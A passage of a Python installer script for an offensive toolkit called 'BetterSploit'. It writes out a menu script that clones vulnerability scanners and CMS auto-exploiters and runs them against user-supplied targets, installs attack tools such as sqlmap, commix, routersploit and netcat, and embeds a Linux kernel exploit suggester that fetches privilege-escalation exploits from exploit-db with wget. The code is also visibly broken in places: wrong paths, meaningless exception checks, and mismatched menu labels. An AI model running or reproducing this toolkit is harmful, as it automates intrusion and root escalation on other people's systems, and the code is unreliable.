#!/usr/bin/env python

import os
import subprocess as sub

try:
    os.mkdir("BetterSploit")
except FileExistsError:
    pass
os.chdir("BetterSploit/modules")


def all_scan():
    try:
        file = open("BetterSploit/AllScan.py", "w")
        if FileExistsError:
            pass
        file.write('''
import subprocess as sub
import os


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    purple = '\033[0;35m'
    green = '\033[0;32m'
    blue = '\033[34m'
    end = '\033[m'

scanners = {
    1: "git clone https://github.com/skavngr/rapidscan.git",
    2: "git clone https://github.com/04x/ICG-AutoExploiterBoT.git",
    3: "git clone https://github.com/pradeepjairamani/CMS_Striker.git",
    4: "git clone https://github.com/EnableSecurity/wafw00f.git",
    5: "sudo apt install openvas",
    6: "git clone https://github.com/zaproxy/zaproxy.git"
}
try:
    os.mkdir("BetterSploit/AllScan")
except FileExistsError:
    pass
os.chdir("BetterSploit/AllScan")
try:
    file = open("BetterSploit/AllScan/AllScan_banner.txt", "w")
    file.write("""
                             _____ _ _ _____
                            |  _  | | |   __|___ ___ ___
                            |     | | |__   |  _| .'|   |
                            |__|__|_|_|_____|___|__,|_|_|
""")
    file.close()
except FileExistsError:
    pass
def all_scan():
    sub.call("cat BetterSploit/AllScan/AllScan_banner.txt | lolcat -a -d 5", shell=True)
    print(f"""\n\n{Colors.green}
Name                                Description
----                                -----------
1)   rapidscan                      All In One Vulnerability Scanner
2)   ICG-AutoExploiterBoT           Wordpress, Joomla, Drupal, OsCommerce, Prestashop, Opencart Vulnerability Scanner
3)   CMS_Striker                    AUTOMATED PENETRATION TESTING AND INFORMATION GATHERING FOR CONTENT MANAGEMENT SYSTEMS
4)   wafw00f                        Web Based Vulnerability Scanner
5)   OpenVas                        Web UI Vulnerability Scanner
6)   Zap-Proxy                      Automatically Find Security Vulnerabilities In Your Web Applications{Colors.red}
    """)
    all_scan_shell = input(f"{Colors.red}[ Enter Option ] :> ")
    if all_scan_shell == "1" or all_scan_shell == "fuxploider" or all_scan_shell == "Fuxploider":
        check_install = input("Do You Already Have fuxploider Installed? (y or n) : ")
        if check_install == "y" or check_install == "Y":
            directory_input = input("Enter Directory That fuxploider Is Located In > ")
            target = input("[ Enter Domain ] > ")
            sub.call(f"python {directory_input}/rapidscan.py {target}", shell=True)
        elif check_install == "n" or check_install == "N":
            sub.call(scanners[1], shell=True)
            directory_input = input("Enter Directory That fuxploider Is Located In > ")
            target = input("[ Enter Domain ] > ")
            sub.call(f"python {directory_input}/rapidscan.py {target}", shell=True)
        else:
            print("Error!")
    elif all_scan_shell == "2" or all_scan_shell == "ICG-AutoExploiterBoT":
        check_install = input("Do You Already Have ICG-AutoExploiterBoT Installed? (y or n) : ")
        if check_install == "y" or check_install == "Y":
            directory_input = input("Enter Directory That ICG-AutoExploiterBoT Is Located In > ")
            sub.call(f"python {directory_input}/icgAutoExploiter.py 1", shell=True)
        elif check_install == "n" or check_install == "N":
            sub.call(scanners[2], shell=True)
            directory_input = input("Enter Directory That ICG-AutoExploiterBoT Is Located In > ")
            sub.call(f"python {directory_input}/icgAutoExploiter.py 1", shell=True)
        else:
            print("Error")
    elif all_scan_shell == "3" or all_scan_shell == "CMS_Striker":
        check_install = input("Do You Already Have ICG-AutoExploiterBoT Installed? (y or n) : ")
        if check_install == "y" or check_install == "Y":
            directory_input = input("Enter Directory That CMS_Striker Is Located In >")
            target_url = input("[ Enter URL ] :> ")
            sub.call(f"python {directory_input}/cms_striker.py -v -t {target_url}")
        elif check_install == "N" or check_install == "n":
            sub.call(scanners[3], shell=True)
            directory_input = input("Enter Directory That CMS_Striker Is Located In >")
            target_url = input("[ Enter URL ] :> ")
            sub.call(f"python {directory_input}/cms_striker.py -v -t {target_url}")
        else:
            print("Error")
    elif all_scan_shell == "wafw00f" or all_scan_shell == "4":
        check_install = input("Do You Already Have WafW00f Installed (y or n) > ")
        if check_install == "y" or check_install == "Y":
            target = input("Enter URL > ")
            sub.call(f"wafw00f -v -a {target}", shell=True)
        elif check_install == "n" or check_install == "N":
            sub.call(scanners[4], shell=True)
            sub.call("sudo python wafw00f/setup.py install")
            target = input("Enter URL > ")
            sub.call(f"wafw00f -v -a {target}", shell=True)
        else:
            print("Error")
    elif all_scan_shell == "OpenVAS" or all_scan_shell == "OpenVas" or all_scan_shell == "5":
        check_install = input("Do You Already Have OpenVas Installed (y or n) > ")
        if check_install == "y" or check_install == "Y":
            sub.call("sudo openvas-setup", shell=True)
        elif check_install == "n" or check_install == "N":
            sub.call(scanners[5], shell=True)
            sub.call("sudo openvas-setup", shell=True)
    elif all_scan_shell == "6" or all_scan_shell == "Zap-Proxy":
        check_install = input("Do You Already Have Zap-Proxy Installed (y or n) > ")
        if check_install == "Y" or check_install == "y":
            sub.call("owasp-zap", shell=True)
        elif check_install == "n" or check_install == "N":
            sub.call("sudo apt install owasp-zap", shell=True)
            sub.call("owasp-zap")
        else:
            print("Error")

if __name__ == "__main__":
    try:
        all_scan()
    except KeyboardInterrupt:
        print("Exiting...")
        exit(0)
    ''')
        file.close()
    except FileExistsError:
        pass


def requirements():
    sub.call(
        "pip3 install mysql.connector;apt install curl:git clone https://github.com/jondonas/linux-exploit-suggester-2.git; pip3 install coloredlogs;pip install paramiko;pip install impacket;sudo apt install sqlmap;sudo apt install commix;sudo apt install routersploit;sudo apt install lolcat;sudo apt install netcat;sudo apt install exploitdb;sudo apt install gcc;pip3 install mega;pip3 install mega.py",
        shell=True)


def linux_exploit_suggester():
    try:
        file = open("BetterSploit/modules/linux-exploit-suggester.pl", "w")
        if FileExistsError:
            pass
        file.write("""
#!/usr/bin/perl
use strict;
use warnings;
use Getopt::Std;

our $VERSION = '2';

my %opts;
getopts( 'k:hd', \%opts );
if (exists $opts{h}) {
    usage();
    exit;
};

print_banner();
my ( $khost, $is_partial ) = get_kernel();
print "  Local Kernel: \e[00;33m$khost\e[00m\n";

my %exploits = get_exploits();
print '  Searching ' . scalar keys(%exploits) . " exploits...\n\n";
print "  \e[1;35mPossible Exploits\e[00m\n";

my $count = 1;
my @applicable = ();
EXPLOIT:
foreach my $key ( sort keys %exploits ) {
    foreach my $kernel ( @{ $exploits{$key}{vuln} } ) {

        if (     $khost eq $kernel
              or ( $is_partial and index($kernel,$khost) == 0 )
        ) {
            $exploits{$key}{key} = $key;
            push(@applicable, $exploits{$key});
            print "  \e[00;33m[\e[00m\e[00;31m$count\e[00m\e[00;33m]\e[00m ";
            print "\e[00;33m$key\e[00m";
            print " \e[00;33m($kernel)\e[00m" if $is_partial;

            my $alt = $exploits{$key}{alt};
            my $cve = $exploits{$key}{cve};
            my $mlw = $exploits{$key}{mil};
            if ( $alt or $cve ) {
                print "\n";
            }
            if ( $alt ) { print "      Alt: $alt "; }
            if ( $cve ) { print "      CVE-$cve"; }
            if ( $mlw ) { print "\n      Source: $mlw"; }
            print "\n";
            $count += 1;
            next EXPLOIT;
        }
    }
}
print "\n";

if (!@applicable) {
    print "  No exploits are available for this kernel version\n\n";
    exit;
}

if (exists $opts{d}) {
    print "  \e[1;36mExploit Download\e[00m\n";
    print "  (Download all: \e[00;33m'a'\e[00m / Individually: \e[00;33m'2,4,5'\e[00m ";
    print "/ Exit: \e[00;33m^c\e[00m)\n";
    print "  Select exploits to download: ";

    while (1) {
        my $input = <STDIN>;
        $input =~ s/\s+//g;

        if ($input =~ /^a$/) {
            my @selected = ();
            for (my $i=1; $i <= scalar @applicable; $i++) {
               push(@selected, $i);
            }
            download_exploits(\@selected, \@applicable);
            last;
        }
        elsif ($input =~ /^(0|[1-9][0-9]*)(,(0|[1-9][0-9]*))*$/) {
            my @selected = uniq(split(',', $input));
            @selected = sort {$a <=> $b} @selected;
            if ($selected[0] > 0 && $selected[-1] <= scalar @applicable) {
                download_exploits(\@selected, \@applicable);
                last;
            }
            else {
               print "  \e[00;31mInput is out of range.\e[00m Select exploits to download: ";
            }
        }
        else {
            print "  \e[00;31mInvalid input.\e[00m Select exploits to download: ";
        }
    }
};
exit;

######################
## extra functions  ##
######################

sub get_kernel {
    my $khost = '';

    if ( exists $opts{k} ) {
        $khost = $opts{k};
    }
    else {
        $khost = `uname -r |cut -d"-" -f1`;
        chomp $khost;
    }

    if (!defined $khost || !($khost =~ /^[0-9]+([.][0-9]+)*$/)) {
        print "  \e[00;31mSpecified kernel is in the wrong format\e[00m\n";
        print "  Try a kernel format like this: 3.2.0\n\n";
        exit;
    }

    # partial kernels might be provided by the user,
    # such as '2.4' or '2.6.'
    my $is_partial = $khost =~ /^\d+\.\d+\.\d?/ ? 0 : 1;
    return ( $khost, $is_partial );
}

sub download_exploits {
    my ($sref, $aref) = @_;
    my @selected = @{ $sref };
    my @applicable = @{ $aref };
    my $exploit_base = "www.exploit-db.com/exploits";
    my $download_base = "https://www.exploit-db.com/raw/";
    print "\n";

    foreach my $num (@selected) {
        my $mil = $applicable[$num-1]{mil};
        next if (!defined $mil);
        my ($exploit_num) = ($mil =~ /^.*\/([1-9][0-9]*)\/?$/);
        
        if ($exploit_num && index($mil, $exploit_base) != -1) {
            my $url = $download_base . $exploit_num;
            my $file = "exploit_$applicable[$num-1]{key}";
            print "  Downloading \e[00;33m$url\e[00m -> \e[00;33m$file\e[00m\n";
            system "wget $url -O $file > /dev/null 2>&1";
        }
        else {
            print "  No exploit code available for \e[00;33m$applicable[$num-1]{key}\e[00m\n"; 
        }
    }
    print "\n";
}

sub uniq {
    my %seen;
    grep !$seen{$_}++, @_;
}

sub usage {
print_banner();
print "  \e[00;35mUsage:\e[00m $0 [-h] [-k kernel] [-d]\n\n";
print "  \e[00;33m[\e[00m\e[00;31m-h\e[00m\e[00;33m]\e[00m Help (this message)\n";
print "  \e[00;33m[\e[00m\e[00;31m-k\e[00m\e[00;33m]\e[00m Kernel number (eg. 2.6.28)\n";
print "  \e[00;33m[\e[00m\e[00;31m-d\e[00m\e[00;33m]\e[00m Open exploit download menu\n\n";

print "  You can also provide a partial kernel version (eg. 2.4)\n";
print "  to see all exploits available.\n\n";
}

sub print_banner {
print "\n\e[00;33m  #############################\e[00m\n";
print "\e[1;31m    Linux Exploit Suggester $VERSION\e[00m\n";
print "\e[00;33m  #############################\e[00m\n\n";
}

sub get_exploits {
  return (
    'w00t' => {
        vuln => [
            '2.4.10', '2.4.16', '2.4.17', '2.4.18',
            '2.4.19', '2.4.20', '2.4.21',
        ]
    },
    'brk' => {
        vuln => [ '2.4.10', '2.4.18', '2.4.19', '2.4.20', '2.4.21', '2.4.22' ],
    },
    'ave' => { vuln => [ '2.4.19', '2.4.20' ] },

    'elflbl' => {
        vuln => ['2.4.29'],
        mil  => 'http://www.exploit-db.com/exploits/744',
    },

    'elfdump'      => { vuln => ['2.4.27'] },
    'elfcd'        => { vuln => ['2.6.12'] },
    'expand_stack' => { vuln => ['2.4.29'] },

    'h00lyshit' => {
        vuln => [
            '2.6.8',  '2.6.10', '2.6.11', '2.6.12',
            '2.6.13', '2.6.14', '2.6.15', '2.6.16',
        ],
        cve => '2006-3626',
        mil => 'http://www.exploit-db.com/exploits/2013',
    },

    'kdump' => { vuln => ['2.6.13'] },
    'km2'   => { vuln => [ '2.4.18', '2.4.22' ] },
    'krad' =>
      { vuln => [ '2.6.5', '2.6.7', '2.6.8', '2.6.9', '2.6.10', '2.6.11' ] },

    'krad3' => {
        vuln => [ '2.6.5', '2.6.7', '2.6.8', '2.6.9', '2.6.10', '2.6.11' ],
        mil => 'http://exploit-db.com/exploits/1397',
    },

    'local26' => { vuln => ['2.6.13'] },
    'loko'    => { vuln => [ '2.4.22', '2.4.23', '2.4.24' ] },

    'mremap_pte' => {
        vuln => [ '2.4.20', '2.2.24', '2.4.25', '2.4.26', '2.4.27' ],
        mil => 'http://www.exploit-db.com/exploits/160',
    },

    'newlocal' => { vuln => [ '2.4.17', '2.4.19' ] },
    'ong_bak'  => { vuln => ['2.6.5'] },
    'ptrace' =>
      { vuln => [ '2.4.18', '2.4.19', '2.4.20', '2.4.21', '2.4.22' ] },
    'ptrace_kmod' => {
        vuln => [ '2.4.18', '2.4.19', '2.4.20', '2.4.21', '2.4.22' ],
        cve  => '2007-4573',
    },
    'ptrace_kmod2' => {
        vuln => [
            '2.6.26', '2.6.27', '2.6.28', '2.6.29', '2.6.30', '2.6.31',
            '2.6.32', '2.6.33', '2.6.34',
        ],
        alt => 'ia32syscall,robert_you_suck',
        mil => 'http://www.exploit-db.com/exploits/15023',
        cve => '2010-3301',
    },
    'ptrace24' => { vuln => ['2.4.9'] },
    'pwned'    => { vuln => ['2.6.11'] },
    'py2'      => { vuln => [ '2.6.9', '2.6.17', '2.6.15', '2.6.13' ] },
    'raptor_prctl' => {
        vuln => [ '2.6.13', '2.6.14', '2.6.15', '2.6.16', '2.6.17' ],
        cve  => '2006-2451',
        mil => 'http://www.exploit-db.com/exploits/2031',
    },
    'prctl' => {
        vuln => [ '2.6.13', '2.6.14', '2.6.15', '2.6.16', '2.6.17' ],
        mil => 'http://www.exploit-db.com/exploits/2004',
    },
    'prctl2' => {
        vuln => [ '2.6.13', '2.6.14', '2.6.15', '2.6.16', '2.6.17' ],
        mil => 'http://www.exploit-db.com/exploits/2005',
    },
    'prctl3' => {
        vuln => [ '2.6.13', '2.6.14', '2.6.15', '2.6.16', '2.6.17' ],
        mil => 'http://www.exploit-db.com/exploits/2006',
    },
    'prctl4' => {
        vuln => [ '2.6.13', '2.6.14', '2.6.15', '2.6.16', '2.6.17' ],
        mil => 'http://www.exploit-db.com/exploits/2011',
    },
    'remap'      => { vuln => ['2.4'] },
    'rip'        => { vuln => ['2.2'] },
    'stackgrow2' => { vuln => [ '2.4.29', '2.6.10' ] },
    'uselib24' => {
        vuln => [ '2.6.10', '2.4.17', '2.4.22', '2.4.25', '2.4.27', '2.4.29' ]
    },
    'newsmp'   => { vuln => ['2.6'] },
    'smpracer' => { vuln => ['2.4.29'] },
    'loginx'   => { vuln => ['2.4.22'] },
    'exp.sh'   => { vuln => [ '2.6.9', '2.6.10', '2.6.16', '2.6.13' ] },
    'vmsplice1' => {
        vuln => [
            '2.6.17', '2.6.18', '2.6.19', '2.6.20', '2.6.21', '2.6.22',
            '2.6.23', '2.6.24', '2.6.24.1',
        ],
        alt => 'jessica biel',
        cve => '2008-0600',
        mil => 'http://www.exploit-db.com/exploits/5092',
    },
    'vmsplice2' => {
        vuln => [ '2.6.23', '2.6.24' ],
        alt  => 'diane_lane',
        cve  => '2008-0600',
        mil  => 'http://www.exploit-db.com/exploits/5093',
    },
    'vconsole' => {
        vuln => ['2.6'],
        cve  => '2009-1046',
    },
    'sctp' => {
        vuln => ['2.6.26'],
        cve  => '2008-4113',
    },
    'ftrex' => {
        vuln => [
            '2.6.11', '2.6.12', '2.6.13', '2.6.14', '2.6.15', '2.6.16',
            '2.6.17', '2.6.18', '2.6.19', '2.6.20', '2.6.21', '2.6.22',
        ],
        cve => '2008-4210',
        mil => 'http://www.exploit-db.com/exploits/6851',
    },
    'exit_notify' => {
        vuln => [ '2.6.25', '2.6.26', '2.6.27', '2.6.28', '2.6.29' ],
        mil => 'http://www.exploit-db.com/exploits/8369',
    },
    'udev' => {
        vuln => [ '2.6.25', '2.6.26', '2.6.27', '2.6.28', '2.6.29' ],
        alt  => 'udev <1.4.1',
        cve  => '2009-1185',
        mil => 'http://www.exploit-db.com/exploits/8478',
    },

    'sock_sendpage2' => {
        vuln => [
            '2.4.4',  '2.4.5',  '2.4.6',  '2.4.7',  '2.4.8',  '2.4.9',
            '2.4.10', '2.4.11', '2.4.12', '2.4.13', '2.4.14', '2.4.15',
            '2.4.16', '2.4.17', '2.4.18', '2.4.19', '2.4.20', '2.4.21',
            '2.4.22', '2.4.23', '2.4.24', '2.4.25', '2.4.26', '2.4.27',
            '2.4.28', '2.4.29', '2.4.30', '2.4.31', '2.4.32', '2.4.33',
            '2.4.34', '2.4.35', '2.4.36', '2.4.37', '2.6.0',  '2.6.1',
            '2.6.2',  '2.6.3',  '2.6.4',  '2.6.5',  '2.6.6',  '2.6.7',
            '2.6.8',  '2.6.9',  '2.6.10', '2.6.11', '2.6.12', '2.6.13',
            '2.6.14', '2.6.15', '2.6.16', '2.6.17', '2.6.18', '2.6.19',
            '2.6.20', '2.6.21', '2.6.22', '2.6.23', '2.6.24', '2.6.25',
            '2.6.26', '2.6.27', '2.6.28', '2.6.29', '2.6.30',
        ],
        alt => 'proto_ops',
        cve => '2009-2692',
        mil => 'http://www.exploit-db.com/exploits/9436',
    },

    'sock_sendpage' => {
        vuln => [
            '2.4.4',  '2.4.5',  '2.4.6',  '2.4.7',  '2.4.8',  '2.4.9',
            '2.4.10', '2.4.11', '2.4.12', '2.4.13', '2.4.14', '2.4.15',
            '2.4.16', '2.4.17', '2.4.18', '2.4.19', '2.4.20', '2.4.21',
            '2.4.22', '2.4.23', '2.4.24', '2.4.25', '2.4.26', '2.4.27',
            '2.4.28', '2.4.29', '2.4.30', '2.4.31', '2.4.32', '2.4.33',
            '2.4.34', '2.4.35', '2.4.36', '2.4.37', '2.6.0',  '2.6.1',
            '2.6.2',  '2.6.3',  '2.6.4',  '2.6.5',  '2.6.6',  '2.6.7',
            '2.6.8',  '2.6.9',  '2.6.10', '2.6.11', '2.6.12', '2.6.13',
            '2.6.14', '2.6.15', '2.6.16', '2.6.17', '2.6.18', '2.6.19',
            '2.6.20', '2.6.21', '2.6.22', '2.6.23', '2.6.24', '2.6.25',
            '2.6.26', '2.6.27', '2.6.28', '2.6.29', '2.6.30',
        ],
        alt => 'wunderbar_emporium',
        cve => '2009-2692',
        mil => 'http://www.exploit-db.com/exploits/9435',
    },
    'udp_sendmsg_32bit' => {
        vuln => [
            '2.6.1',  '2.6.2',  '2.6.3',  '2.6.4',  '2.6.5',  '2.6.6',
            '2.6.7',  '2.6.8',  '2.6.9',  '2.6.10', '2.6.11', '2.6.12',
            '2.6.13', '2.6.14', '2.6.15', '2.6.16', '2.6.17', '2.6.18',
            '2.6.19',
        ],
        cve => '2009-2698',
        mil =>
          'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c',
    },
    'pipe.c_32bit' => {
        vuln => [
            '2.4.4',  '2.4.5',  '2.4.6',  '2.4.7',  '2.4.8',  '2.4.9',
            '2.4.10', '2.4.11', '2.4.12', '2.4.13', '2.4.14', '2.4.15',
            '2.4.16', '2.4.17', '2.4.18', '2.4.19', '2.4.20', '2.4.21',
            '2.4.22', '2.4.23', '2.4.24', '2.4.25', '2.4.26', '2.4.27',
            '2.4.28', '2.4.29', '2.4.30', '2.4.31', '2.4.32', '2.4.33',
            '2.4.34', '2.4.35', '2.4.36', '2.4.37', '2.6.15', '2.6.16',
            '2.6.17', '2.6.18', '2.6.19', '2.6.20', '2.6.21', '2.6.22',
            '2.6.23', '2.6.24', '2.6.25', '2.6.26', '2.6.27', '2.6.28',
            '2.6.29', '2.6.30', '2.6.31',
        ],
        cve => '2009-3547',
        mil =>
          'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c',
    },
    'do_pages_move' => {
        vuln => [
            '2.6.18', '2.6.19', '2.6.20', '2.6.21', '2.6.22', '2.6.23',
            '2.6.24', '2.6.25', '2.6.26', '2.6.27', '2.6.28', '2.6.29',
            '2.6.30', '2.6.31',
        ],
        alt => 'sieve',
        cve => '2010-0415',
        mil => 'Spenders Enlightenment',
    },
    'reiserfs' => {
        vuln => [
            '2.6.18', '2.6.19', '2.6.20', '2.6.21', '2.6.22', '2.6.23',
            '2.6.24', '2.6.25', '2.6.26', '2.6.27', '2.6.28', '2.6.29',
            '2.6.30', '2.6.31', '2.6.32', '2.6.33', '2.6.34',
        ],
        cve => '2010-1146',
        mil => 'http://www.exploit-db.com/exploits/12130',
    },
    'can_bcm' => {
        vuln => [
            '2.6.18', '2.6.19', '2.6.20', '2.6.21', '2.6.22', '2.6.23',
            '2.6.24', '2.6.25', '2.6.26', '2.6.27', '2.6.28', '2.6.29',
            '2.6.30', '2.6.31', '2.6.32', '2.6.33', '2.6.34', '2.6.35',
            '2.6.36',
        ],
        cve => '2010-2959',
        mil => 'http://www.exploit-db.com/exploits/14814',
    },
    'rds' => {
        vuln => [
            '2.6.30', '2.6.31', '2.6.32', '2.6.33',
            '2.6.34', '2.6.35', '2.6.36',
        ],
        mil => 'http://www.exploit-db.com/exploits/15285',
        cve => '2010-3904',
    },
    'half_nelson1' => {
        vuln => [
            '2.6.0',  '2.6.1',  '2.6.2',  '2.6.3',  '2.6.4',  '2.6.5',
            '2.6.6',  '2.6.7',  '2.6.8',  '2.6.9',  '2.6.10', '2.6.11',
            '2.6.12', '2.6.13', '2.6.14', '2.6.15', '2.6.16', '2.6.17',
            '2.6.18', '2.6.19', '2.6.20', '2.6.21', '2.6.22', '2.6.23',
            '2.6.24', '2.6.25', '2.6.26', '2.6.27', '2.6.28', '2.6.29',
            '2.6.30', '2.6.31', '2.6.32', '2.6.33', '2.6.34', '2.6.35',
            '2.6.36',
        ],
        alt => 'econet',
        cve => '2010-3848',
        mil => 'http://www.exploit-db.com/exploits/17787',
    },
    'half_nelson2' => {
        vuln => [
            '2.6.0',  '2.6.1',  '2.6.2',  '2.6.3',  '2.6.4',  '2.6.5',
            '2.6.6',  '2.6.7',  '2.6.8',  '2.6.9',  '2.6.10', '2.6.11',
            '2.6.12', '2.6.13', '2.6.14', '2.6.15', '2.6.16', '2.6.17',
            '2.6.18', '2.6.19', '2.6.20', '2.6.21', '2.6.22', '2.6.23',
            '2.6.24', '2.6.25', '2.6.26', '2.6.27', '2.6.28', '2.6.29',
            '2.6.30', '2.6.31', '2.6.32', '2.6.33', '2.6.34', '2.6.35',
            '2.6.36',
        ],
        alt => 'econet',
        cve => '2010-3850',
        mil => 'http://www.exploit-db.com/exploits/17787',
    },
    'half_nelson3' => {
        vuln => [
            '2.6.0',  '2.6.1',  '2.6.2',  '2.6.3',  '2.6.4',  '2.6.5',
            '2.6.6',  '2.6.7',  '2.6.8',  '2.6.9',  '2.6.10', '2.6.11',
            '2.6.12', '2.6.13', '2.6.14', '2.6.15', '2.6.16', '2.6.17',
            '2.6.18', '2.6.19', '2.6.20', '2.6.21', '2.6.22', '2.6.23',
            '2.6.24', '2.6.25', '2.6.26', '2.6.27', '2.6.28', '2.6.29',
            '2.6.30', '2.6.31', '2.6.32', '2.6.33', '2.6.34', '2.6.35',
            '2.6.36',
        ],
        alt => 'econet',
        cve => '2010-4073',
        mil => 'http://www.exploit-db.com/exploits/17787',
    },
    'caps_to_root' => {
        vuln => [ '2.6.34', '2.6.35', '2.6.36' ],
        cve  => 'n/a',
        mil => 'http://www.exploit-db.com/exploits/15916',
    },
    'american-sign-language' => {
        vuln => [
            '2.6.0',  '2.6.1',  '2.6.2',  '2.6.3',  '2.6.4',  '2.6.5',
            '2.6.6',  '2.6.7',  '2.6.8',  '2.6.9',  '2.6.10', '2.6.11',
            '2.6.12', '2.6.13', '2.6.14', '2.6.15', '2.6.16', '2.6.17',
            '2.6.18', '2.6.19', '2.6.20', '2.6.21', '2.6.22', '2.6.23',
            '2.6.24', '2.6.25', '2.6.26', '2.6.27', '2.6.28', '2.6.29',
            '2.6.30', '2.6.31', '2.6.32', '2.6.33', '2.6.34', '2.6.35',
            '2.6.36',
        ],
        cve => '2010-4347',
        mil => 'http://www.securityfocus.com/bid/45408',
    },
    'pktcdvd' => {
        vuln => [
            '2.6.0',  '2.6.1',  '2.6.2',  '2.6.3',  '2.6.4',  '2.6.5',
            '2.6.6',  '2.6.7',  '2.6.8',  '2.6.9',  '2.6.10', '2.6.11',
            '2.6.12', '2.6.13', '2.6.14', '2.6.15', '2.6.16', '2.6.17',
            '2.6.18', '2.6.19', '2.6.20', '2.6.21', '2.6.22', '2.6.23',
            '2.6.24', '2.6.25', '2.6.26', '2.6.27', '2.6.28', '2.6.29',
            '2.6.30', '2.6.31', '2.6.32', '2.6.33', '2.6.34', '2.6.35',
            '2.6.36',
        ],
        cve => '2010-3437',
        mil => 'http://www.exploit-db.com/exploits/15150',
    },
    'video4linux' => {
        vuln => [
            '2.6.0',  '2.6.1',  '2.6.2',  '2.6.3',  '2.6.4',  '2.6.5',
            '2.6.6',  '2.6.7',  '2.6.8',  '2.6.9',  '2.6.10', '2.6.11',
            '2.6.12', '2.6.13', '2.6.14', '2.6.15', '2.6.16', '2.6.17',
            '2.6.18', '2.6.19', '2.6.20', '2.6.21', '2.6.22', '2.6.23',
            '2.6.24', '2.6.25', '2.6.26', '2.6.27', '2.6.28', '2.6.29',
            '2.6.30', '2.6.31', '2.6.32', '2.6.33',
        ],
        cve => '2010-3081',
        mil => 'http://www.exploit-db.com/exploits/15024',
    },
    'memodipper' => {
        vuln => [
            '2.6.39', '3.0.0', '3.0.1', '3.0.2', '3.0.3', '3.0.4',
            '3.0.5',  '3.0.6', '3.1.0',
        ],
        cve => '2012-0056',
        mil => 'http://www.exploit-db.com/exploits/18411',
    },
    'semtex' => {
        vuln => [
            '2.6.37', '2.6.38', '2.6.39', '3.0.0', '3.0.1', '3.0.2',
            '3.0.3',  '3.0.4',  '3.0.5',  '3.0.6', '3.1.0',
        ],
        cve => '2013-2094',
        mil => 'http://www.exploit-db.com/exploits/25444',
    },
    'perf_swevent' => {
        vuln => [
            '3.0.0', '3.0.1', '3.0.2', '3.0.3', '3.0.4', '3.0.5',
            '3.0.6', '3.1.0', '3.2.0', '3.3.0', '3.4.0', '3.4.1',
            '3.4.2', '3.4.3', '3.4.4', '3.4.5', '3.4.6', '3.4.8',
            '3.4.9', '3.5.0', '3.6.0', '3.7.0', '3.8.0', '3.8.1',
            '3.8.2', '3.8.3', '3.8.4', '3.8.5', '3.8.6', '3.8.7',
            '3.8.8', '3.8.9',
        ],
        cve => '2013-2094',
        mil => 'http://www.exploit-db.com/exploits/26131',
    },
    'msr' => {
        vuln => [
            '2.6.18', '2.6.19', '2.6.20', '2.6.21', '2.6.22', '2.6.23',
            '2.6.24', '2.6.25', '2.6.26', '2.6.27', '2.6.27', '2.6.28',
            '2.6.29', '2.6.30', '2.6.31', '2.6.32', '2.6.33', '2.6.34',
            '2.6.35', '2.6.36', '2.6.37', '2.6.38', '2.6.39', '3.0.0',
            '3.0.1',  '3.0.2',  '3.0.3',  '3.0.4',  '3.0.5',  '3.0.6',
            '3.1.0',  '3.2.0',  '3.3.0',  '3.4.0',  '3.5.0',  '3.6.0',
            '3.7.0',  '3.7.6',
        ],
        cve => '2013-0268',
        mil => 'http://www.exploit-db.com/exploits/27297',
    },
    'timeoutpwn' => {
        vuln => [
            '3.4.0',  '3.5.0',  '3.6.0',  '3.7.0',  '3.8.0',  '3.8.9', 
            '3.9.0',  '3.10.0', '3.11.0', '3.12.0', '3.13.0', '3.4.0',
            '3.5.0',  '3.6.0',  '3.7.0',  '3.8.0',  '3.8.5',  '3.8.6',  
            '3.8.9',  '3.9.0',  '3.9.6',  '3.10.0', '3.10.6', '3.11.0',
            '3.12.0', '3.13.0', '3.13.1'
        ],
        cve => '2014-0038',
        mil => 'http://www.exploit-db.com/exploits/31346',
    },
    'rawmodePTY' => {
        vuln => [
            '2.6.31', '2.6.32', '2.6.33', '2.6.34', '2.6.35', '2.6.36',
            '2.6.37', '2.6.38', '2.6.39', '3.14.0', '3.15.0'
        ],
        cve => '2014-0196',
        mil => 'http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c',
    },
    'overlayfs' => {
        vuln => [
            '3.13.0', '3.16.0', '3.19.0'
        ],
        cve => '2015-8660',
        mil => 'http://www.exploit-db.com/exploits/39230',
    },
    'pp_key' => {
        vuln => [
			'3.4.0',  '3.5.0',  '3.6.0',  '3.7.0',  '3.8.0',  '3.8.1',  
            '3.8.2',  '3.8.3',  '3.8.4',  '3.8.5',  '3.8.6',  '3.8.7',  
            '3.8.8',  '3.8.9',  '3.9.0',  '3.9.6',  '3.10.0', '3.10.6', 
            '3.11.0', '3.12.0', '3.13.0', '3.13.1'
        ],
        cve => '2016-0728',
        mil => 'http://www.exploit-db.com/exploits/39277',
    },
    'dirty_cow' => {
        vuln => [
            '2.6.22', '2.6.23', '2.6.24', '2.6.25', '2.6.26', '2.6.27', 
			'2.6.27', '2.6.28', '2.6.29', '2.6.30', '2.6.31', '2.6.32', 
            '2.6.33', '2.6.34', '2.6.35', '2.6.36', '2.6.37', '2.6.38', 
            '2.6.39', '3.0.0',  '3.0.1',  '3.0.2',  '3.0.3',  '3.0.4',  
            '3.0.5',  '3.0.6',  '3.1.0',  '3.2.0',  '3.3.0',  '3.4.0',  
            '3.5.0',  '3.6.0',  '3.7.0',  '3.7.6',  '3.8.0',  '3.9.0', 
            '3.10.0', '3.11.0', '3.12.0', '3.13.0', '3.14.0', '3.15.0', 
            '3.16.0', '3.17.0', '3.18.0', '3.19.0', '4.0.0',  '4.1.0', 
            '4.2.0',  '4.3.0',  '4.4.0',  '4.5.0',  '4.6.0',  '4.7.0'
        ],
        cve => '2016-5195',
        mil => 'http://www.exploit-db.com/exploits/40616',
    },
    'af_packet' => {
        vuln => ['4.4.0' ],
        cve => '2016-8655',
        mil => 'http://www.exploit-db.com/exploits/40871',
    },
    'packet_set_ring' => {
        vuln => ['4.8.0' ],
        cve => '2017-7308',
        mil => 'http://www.exploit-db.com/exploits/41994',
    },
    'clone_newuser' => {
        vuln => [
            '3.3.5', '3.3.4', '3.3.2', '3.2.13', '3.2.9', '3.2.1', 
            '3.1.8', '3.0.5', '3.0.4', '3.0.2', '3.0.1', '3.2', '3.0.1', '3.0'
        ],
        cve => 'N\A',
        mil => 'http://www.exploit-db.com/exploits/38390',
    },
    'get_rekt' => {
        vuln => [
            '4.4.0', '4.8.0', '4.10.0', '4.13.0'
        ],
        cve => '2017-16695',
        mil => 'http://www.exploit-db.com/exploits/45010',
    },
    'exploit_x' => {
        vuln => [
